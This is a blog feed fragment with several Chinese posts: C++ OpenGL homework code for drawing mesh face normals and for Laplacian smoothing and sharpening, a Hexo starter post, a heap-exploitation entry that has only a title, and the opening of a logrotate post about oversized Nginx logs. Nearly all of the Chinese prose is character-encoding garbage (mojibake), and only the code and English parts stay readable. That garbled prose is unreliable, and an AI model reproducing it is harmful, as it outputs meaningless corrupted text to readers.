¼ä¸­æ¯ä¸ªä¸‰è§’é¢ç‰‡(face)çš„æ³•å‘ç”»å‡ºæ¥ï¼ˆæç¤ºï¼šåœ¨æ¯ä¸ªä¸‰è§’é¢ç‰‡çš„é‡å¿ƒå¤„ç”»ï¼‰ï¼›20åˆ†</p></blockquote><p>æ­¤å‡½æ•°å£°æ˜ä¸ºï¼šbool ogl_writer2(bool _orient = true, bool _smooth = false);<br>Tips: å¯ä»¥å‚ç…§å‡½æ•°bool ogl_writer(bool  _orient = true, bool _smooth = false)çš„æ¥å®ç°ï¼Œè¿™æ—¶åªéœ€è¦åœ¨æ¯ä¸ªä¸‰è§’é¢ç‰‡ä¸­ç”»å‡ºæ³•å‘å³å¯ï¼ˆæ³•å‘ç”¨Lineè¡¨ç¤ºã€‚æŒ‰é”®ç›˜ä¸Šâ€mâ€å¯ä»¥æŸ¥çœ‹ç”»å‡ºé¢ç‰‡æ³•å‘åçš„ç»“æœã€‚</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">Mesh</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span class="title">ReaderWriterT</span>&lt;Mesh&gt;:</span>:ogl_writer2(<span class="keyword">bool</span> _orient, <span class="keyword">bool</span> _smooth)&#123;<span class="comment">////åœ¨é‡Œé¢æŠŠä¸‰è§’é¢ç‰‡æ³•å‘ç”»å‡º</span></span><br><span class="line">  HalfedgeHandle       cshh;</span><br><span class="line">  Mesh::FacetIterator  fit(mesh_-&gt;facet_begin());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//glShadeModel(GL_FLAT);</span></span><br><span class="line">    glShadeModel(GL_SMOOTH);</span><br><span class="line">    <span class="keyword">int</span> orient = <span class="literal">true</span>;<span class="comment">// (_orient) ? 1 : -1; </span></span><br><span class="line">    mesh_-&gt;update_normals();<span class="comment">//è®¡ç®—é¢æ³•å‘å’Œç‚¹æ³•å‘</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; fit != mesh_-&gt;facet_end(); ++fit) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((*fit).status_.is_deleted()) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      cshh = fit-&gt;halfedge_handle_;</span><br><span class="line">      FacetHandle fh = mesh_-&gt;facet_handle(cshh);</span><br><span class="line">      <span class="keyword">const</span> VertexHandle&amp; vh0 = mesh_-&gt;vertex_handle(cshh);</span><br><span class="line">      glColor3f(<span class="number">1.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>);</span><br><span class="line">      glBegin(GL_LINES);</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> VertexHandle&amp; vh = mesh_-&gt;vertex_handle(cshh);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//glNormal3fv(mesh_-&gt;normal(fh)*orient);</span></span><br><span class="line">        <span class="comment">//glVertex3fv(mesh_-&gt;coord(vh));</span></span><br><span class="line">        cshh = mesh_-&gt;next_halfedge_handle(cshh);</span><br><span class="line">        </span><br><span class="line">        glVertex3fv(mesh_-&gt;calc_centroid(fh));</span><br><span class="line">        glVertex3fv(mesh_-&gt;calc_centroid(fh) + mesh_-&gt;normal(fh));</span><br><span class="line">      &#125; <span class="keyword">while</span> (cshh != fit-&gt;halfedge_handle_);</span><br><span class="line">      glEnd();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹:</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/3FF0CJmga7.png?imageslim" alt="mark">  </p><h2 id="task4"><a href="#task4" class="headerlink" title="task4"></a>task4</h2><blockquote><p>å®ç°ä¸€ç§ç®€å•çš„ä¸‰è§’ç½‘æ ¼å»å™ªç®—æ³•ï¼ˆä¾‹å¦‚æ‹‰æ™®æ‹‰æ–¯å…‰é¡ºï¼‰ï¼›30åˆ†</p></blockquote><p>æ­¤å‡½æ•°å£°æ˜ä¸ºï¼švoid Laplacian_Smoothing();//////////////////å®ç°ä¸€ç§ä¸‰è§’ç½‘æ ¼å»å™ªç®—æ³•<br>Tips: å¯ä»¥å‚ç…§å·²ç»å®ç°çš„ä¸¤ä¸ªå»å™ªç®—æ³•ï¼›æŒ‰é”®ç›˜ä¸Šâ€bâ€å¯ä»¥æŸ¥çœ‹å»å™ªç»“æœã€‚</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:Laplacian_Smoothing()&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/////è¯·å®ç°è‡ªå·±çš„å»å™ªç®—æ³•////////</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> vertex_num = vertex_size();</span><br><span class="line">  <span class="keyword">int</span> iterations;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Input laplacian vertex update iterations(5-30æ¬¡): "</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; iterations;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"ç”±äºè¿­ä»£ï¼Œæ¯”è¾ƒè€—æ—¶ï¼"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Please wait.....  "</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="keyword">clock_t</span> t1 = clock();</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Coord&gt; updateVertexPosition;</span><br><span class="line">    updateVertexPosition.resize(vertex_num);</span><br><span class="line">    VertexIterator vi(vertex_begin());</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; vi != vertex_end(); vi++) &#123;</span><br><span class="line">      HalfedgeHandle&amp; hh = vi-&gt;halfedge_handle_;</span><br><span class="line">      HalfedgeHandle css(opposite_halfedge_handle(hh));</span><br><span class="line">      <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">      <span class="comment">//Coord cd(0, 0, 0);</span></span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        updateVertexPosition[i] += coord(vertex_handle(css));</span><br><span class="line">        <span class="comment">//cd += coord(vertex_handle(css));</span></span><br><span class="line">        j++;</span><br><span class="line">        css = opposite_halfedge_handle(prev_halfedge_handle(css));</span><br><span class="line">      &#125; <span class="keyword">while</span> (opposite_halfedge_handle(css) != hh);</span><br><span class="line">      updateVertexPosition[i] /= j;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//updateVertexPosition.push_back(cd/j);</span></span><br><span class="line">    &#125;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//std::vector&lt;Coord&gt;::iterator vpi = updateVertexPosition.begin();</span></span><br><span class="line">    <span class="keyword">for</span> (vi = vertex_begin(); vi != vertex_end(); vi++) &#123;</span><br><span class="line">      vi-&gt;coord_ = updateVertexPosition[i];</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//vpi++;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (--iterations);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">clock_t</span> t2 = clock();</span><br><span class="line">  <span class="comment">//t2 = (t2-t1)/CLOCKS_PER_SEC;</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"The time of laplacian vertex updating: "</span> &lt;&lt; (t2 - t1)*<span class="number">1.0</span> / CLOCKS_PER_SEC &lt;&lt; <span class="string">"s"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š<br>å»å™ªå‰<img src="https://qiniu.karlrixon.cn/blog/181029/kagkgc82Eb.png?imageslim" alt="mark">å»å™ªå<img src="https://qiniu.karlrixon.cn/blog/181029/b8ED4jA0lE.png?imageslim" alt="mark"></p><h2 id="task5"><a href="#task5" class="headerlink" title="task5"></a>task5</h2><blockquote><p>ï¼ˆå¯é€‰/å¯åšå¯ä¸åšï¼‰å®ç°ä¸€ç§åŸºäºä¸‰è§’ç½‘æ ¼çš„æ“ä½œï¼ˆä¾‹å¦‚ï¼Œç‰¹å¾æå–ï¼Œä¸‰è§’ç½‘æ ¼åˆ†å‰²ï¼Œä¸‰è§’ç½‘æ ¼å˜å½¢ç­‰ç­‰ï¼‰ï¼›20åˆ†</p></blockquote><p>æ­¤å‡½æ•°å£°æ˜ä¸º: void mesh_process();</p><p>æ€è·¯ï¼šå…ˆæ±‚å‡ºä¸€ä¸ªç‚¹çš„ä¸€ç¯é‚»æ¥é¡¶ç‚¹ï¼Œå°†æ¯ä¸ªç‚¹åˆ°è¯¥é¡¶ç‚¹çš„å‘é‡ç›¸åŠ ï¼Œå°†ç®—å¾—çš„å‘é‡åŠ åˆ°è¯¥ç‚¹åŸåæ ‡ä¸Šå¾—åˆ°æ–°åæ ‡ã€‚æ­¥éª¤æ˜¯å…ˆè®¡ç®—æ¯ä¸ªç‚¹çš„æ–°åæ ‡ï¼Œå­˜å‚¨åˆ°å®¹å™¨ï¼Œç„¶åç»Ÿä¸€ä¿®æ”¹ç¨‹åºä¸­meshçš„é¡¶ç‚¹æ•°æ®ã€‚</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:mesh_process()&#123;<span class="comment">///////(å¯é€‰ï¼Œåœ¨ä¸‰è§’ç½‘æ ¼ä¸Šå®ç°ä¸€ç§æ“ä½œï¼Œä¾‹å¦‚ç‰¹å¾æå–ï¼Œç½‘æ ¼åˆ†å‰²ï¼Œä¸‰è§’ç½‘æ ¼å˜å½¢ç­‰ç­‰)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> vertex_num = vertex_size();</span><br><span class="line">  <span class="keyword">int</span> iterations;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Input sharpening vertex update iterations(1-30æ¬¡): "</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; iterations;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"ç”±äºè¿­ä»£ï¼Œæ¯”è¾ƒè€—æ—¶ï¼"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Please wait.....  "</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="keyword">clock_t</span> t1 = clock();</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Coord&gt; updateVertexPosition;</span><br><span class="line">    updateVertexPosition.resize(vertex_num);</span><br><span class="line">    VertexIterator vi(vertex_begin());</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; vi != vertex_end(); vi++) &#123;</span><br><span class="line">      HalfedgeHandle&amp; hh = vi-&gt;halfedge_handle_;</span><br><span class="line">      HalfedgeHandle css(opposite_halfedge_handle(hh));</span><br><span class="line">      <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">      <span class="comment">//Coord cd(0, 0, 0);</span></span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        updateVertexPosition[i] += coord(vertex_handle(css));</span><br><span class="line">        <span class="comment">//cd += coord(vertex_handle(css));</span></span><br><span class="line">        j++;</span><br><span class="line">        css = opposite_halfedge_handle(prev_halfedge_handle(css));</span><br><span class="line">      &#125; <span class="keyword">while</span> (opposite_halfedge_handle(css) != hh);</span><br><span class="line">      updateVertexPosition[i] -= coord(vertex_handle(hh))*j;</span><br><span class="line">      updateVertexPosition[i] *= <span class="number">-1</span>;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//updateVertexPosition.push_back(cd/j);</span></span><br><span class="line">    &#125;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//std::vector&lt;Coord&gt;::iterator vpi = updateVertexPosition.begin();</span></span><br><span class="line">    <span class="keyword">for</span> (vi = vertex_begin(); vi != vertex_end(); vi++) &#123;</span><br><span class="line">      vi-&gt;coord_ += updateVertexPosition[i]*<span class="number">0.1</span>;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//vpi++;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (--iterations);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">clock_t</span> t2 = clock();</span><br><span class="line">  <span class="comment">//t2 = (t2-t1)/CLOCKS_PER_SEC;</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"The time of sharpening vertex updating: "</span> &lt;&lt; (t2 - t1)*<span class="number">1.0</span> / CLOCKS_PER_SEC &lt;&lt; <span class="string">"s"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p>åŸå§‹å›¾å½¢<img src="https://qiniu.karlrixon.cn/blog/181029/D4LKhgkkdi.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181109/eE8bBdcl4L.png?imageslim" alt="mark"><br>å»å™ªå<img src="https://qiniu.karlrixon.cn/blog/181109/3b9c2im837.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181109/6ll9hEAIHb.png?imageslim" alt="mark"><br>å˜å½¢å<img src="https://qiniu.karlrixon.cn/blog/181109/f476cgEAhE.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181109/74jl6gbh05.png?imageslim" alt="mark"></p><h2 id="æ€è·¯æ€»ç»“-amp-é‡åˆ°çš„é—®é¢˜"><a href="#æ€è·¯æ€»ç»“-amp-é‡åˆ°çš„é—®é¢˜" class="headerlink" title="æ€è·¯æ€»ç»“&amp;é‡åˆ°çš„é—®é¢˜"></a>æ€è·¯æ€»ç»“&amp;é‡åˆ°çš„é—®é¢˜</h2><p>task1ä¸­æµ·ä¼¦å…¬å¼æ³¨æ„pè¡¨ç¤ºåŠå‘¨é•¿</p><p>task2ä¸­çš„è®¡ç®—é¡¶ç‚¹æ³•å‘çš„æ€æƒ³æ˜¯å°†ç›¸é‚»çš„æ‰€æœ‰é¢ç‰‡æ³•å‘ç›¸åŠ </p><p>task3ä½¿ç”¨é¢ç‰‡è¿­ä»£å™¨ï¼Œè°ƒç”¨å‡½æ•°ç®—å‡ºä¸‰è§’å½¢ä¸­å¿ƒå’Œæ³•å‘ï¼Œä½¿ç”¨ <code>glBegin(LINES)</code>ç”»çº¿</p><p>task4è¦é¦–å…ˆç®—å‡ºæ‰€æœ‰ç‚¹åœ¨ä¸€ç¯é‚»æ¥é¡¶ç‚¹ä½œç”¨ä¸‹çš„æ­£ç¡®ä½ç½®ï¼ˆå³é‚»æ¥é¡¶ç‚¹ç›¸åŠ é™¤ä»¥é‚»æ¥é¡¶ç‚¹ä¸ªæ•°ï¼‰ï¼Œç„¶åç»Ÿä¸€ä¿®æ”¹meshä¸­é¡¶ç‚¹æ•°æ®ã€‚è¿™é‡Œå­˜å‚¨æ‰€æœ‰é¡¶ç‚¹æ–°ä½ç½®ç”¨åˆ°äº†å®¹å™¨ï¼Œä½¿ç”¨æ—¶è¦æ³¨æ„å…ˆç»™å®¹å™¨åˆ†é…ç©ºé—´ï¼Œè€Œä¸”å®¹å™¨ä¸‹æ ‡ä»0å¼€å§‹ï¼Œä¸ç„¶ä¼šæŠ¥é”™å®¹å™¨ä¸‹æ ‡è¶Šç•Œ</p><p>task5åœ¨task4çš„åŸºç¡€ä¸Šä»¥å¦ä¸€ç§æ–¹æ³•ä¿®æ”¹äº†é¡¶ç‚¹ä½ç½®å®ç°ä¸€ç§æ–°çš„ç½‘æ ¼å˜æ¢æ“ä½œå¿…è¦æ—¶å¯ä»¥è‡ªå·±å‘å†…æ ¸ä»£ç æ·»åŠ ä¸€äº›å‡½æ•°</p>]]></content>
        <author>
            <name><![CDATA[KarlRixonâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/%E5%A0%86%E5%88%A9%E7%94%A8%E5%8F%98%E8%BF%81-glibc-2.25/</id>
        <title><![CDATA[å †åˆ©ç”¨å˜è¿ Glibc<2.25]]></title>
        <updated>2018-10-25T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/%E5%A0%86%E5%88%A9%E7%94%A8%E5%8F%98%E8%BF%81-glibc-2.25/"/>
        <content type="text/html" src="https://doublemice.github.io/%E5%A0%86%E5%88%A9%E7%94%A8%E5%8F%98%E8%BF%81-glibc-2.25/"><![CDATA[å †åˆ©ç”¨å˜è¿ Glibc<2.25]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/12/03/hello-world/</id>
        <title><![CDATA[Hello World]]></title>
        <updated>2018-02-24T03:48:11+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/12/03/hello-world/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/12/03/hello-world/"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
        <author>
            <name><![CDATA[KarlRixonâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/logrotate.html</id>
        <title><![CDATA[Logrotate æ—¥å¿—æ»šåŠ¨ è§£å†³æ—¥å¿—å ç”¨ç©ºé—´è¿‡å¤§]]></title>
        <updated>2017-05-03T16:23:04+08:00</updated>
        <link href="https://www.noisyfox.io/logrotate.html"/>
        <content type="text/html" src="https://www.noisyfox.io/logrotate.html"><![CDATA[<h1>èµ·å› </h1>
<p>å‰å‡ å¤©å‘ç°è‡ªå·±çš„åšå®¢æ²¡æœ‰åŠæ³•ç™»å½•äº†ï¼Œæ¯æ¬¡è¾“å®Œå¯†ç ç™»å½•å®Œéƒ½ä¼šé‡æ–°è·³å›ç™»å½•ç•Œé¢ã€‚ä¸€å¼€å§‹æ˜¯æ€€ç–‘ç™»å½•çš„sessionå‡ºäº†ä»€ä¹ˆé—®é¢˜ï¼Œå› ä¸ºæµè§ˆå™¨å¼€éšèº«æ¨¡å¼åå°±èƒ½ç™»å½•è¿›å»ã€‚ç„¶è€Œå¼€éšèº«æ¨¡å¼è¿›åå°çš„æ—¶å€™åˆä¼šå‡ºç°403é”™è¯¯ï¼Œäºæ˜¯æ‰“ç®—è¿è¿›æ•°æ®åº“æŠŠsessionåˆ é™¤å†è¯•è¯•ã€‚</p>
<p>ç„¶è€Œå½“æˆ‘è¯•å›¾è¿æ¥æ•°æ®åº“æ—¶å´ä¸€ç›´æç¤ºå¤±è´¥ï¼Œäºæ˜¯è¯•å›¾é‡å¯æ•°æ®åº“æœåŠ¡ï¼Œä½†æ˜¯ç³»ç»Ÿæç¤ºå¯åŠ¨å¤±è´¥ã€‚ç”µè„‘åäº†æ€ä¹ˆåŠï¼Ÿé‡å¯å¤§æ³•ï¼ç„¶è€Œæ•°æ®åº“æœåŠ¡ä¾æ—§æ— æ³•å¯åŠ¨ï¼Œå½“æ—¶æˆ‘ä¹Ÿæ˜¯æ‘¸ä¸ç€å¤´è„‘ã€‚æ˜æ˜ä»¥å‰ä¸€ç›´å¥½å¥½çš„æœåŠ¡å™¨æ€ä¹ˆè¯´ç‚¸å°±ç‚¸å‘¢ï¼Ÿ</p>
<h1>çœŸç›¸</h1>
<p>åæ¥æˆ‘æœºæ™ºçš„çœ‹äº†ä¸‹ç£ç›˜çš„å ç”¨æƒ…å†µï¼š</p>
<pre class="brush: bash; title: ; notranslate">df -hl</pre>
<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/df-hl.png"><img loading="lazy" class="aligncenter size-full wp-image-483" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/df-hl.png" alt="df -hl" width="543" height="152" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/df-hl.png 543w, https://www.noisyfox.io/wp-content/uploads/2017/05/df-hl-300x84.png 300w" sizes="(max-width: 543px) 100vw, 543px" /></a></p>
<p>ç„¶åæˆ‘å°±éœ‡æƒŠäº†ï¼ï¼<span style="color: #000000;"><del>éœ‡æƒŠï¼è¿‡æ°”åšä¸»ç¡¬ç›˜ä¸ºä½•è¢«æ¦¨å¹²ï¼è¿™èƒŒåç©¶ç«Ÿæ˜¯äººæ€§çš„&#8230;ï¼ˆå•ª</del></span></p>
<p>ç»è¿‡ä¸€ç•ªæŠ˜è…¾ï¼Œç»ˆäºæ‰¾åˆ°äº†é—®é¢˜çš„æ‰€åœ¨ï¼š</p>
<pre class="brush: bash; title: ; notranslate">du -sh .</pre>
<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/du-sh.png"><img loading="lazy" class="aligncenter size-full wp-image-484" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/du-sh.png" alt="df -hl" width="481" height="96" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/du-sh.png 481w, https://www.noisyfox.io/wp-content/uploads/2017/05/du-sh-300x60.png 300w" sizes="(max-width: 481px) 100vw, 481px" /></a></p>
<p>Nginx çš„æ—¥å¿—æ–‡ä»¶å±…ç„¶å ç”¨äº†14Gçš„ç©ºé—´ï¼Whyï¼Ÿ</p>
<h1>è®ºæ—¥å¿—</h1>
<p>æ—¥å¿—æ–‡ä»¶é€šå¸¸æƒ…å†µä¸‹æ˜¯æœªå‹ç¼©çš„æ˜æ–‡æ–‡æœ¬æ–‡ä»¶ï¼Œåœ¨ä¸€ä¸ªè¿è¡Œæ—¶é—´è¾ƒé•¿çš„ç³»ç»Ÿä¸­æ—¥å¿—æ–‡ä»¶çš„ä½“ç§¯ä¼šè¶Šæ¥è¶Šå¤§ï¼Œç”šè‡³è¿œè¶…ä½ çš„é¢„æœŸã€‚</p>
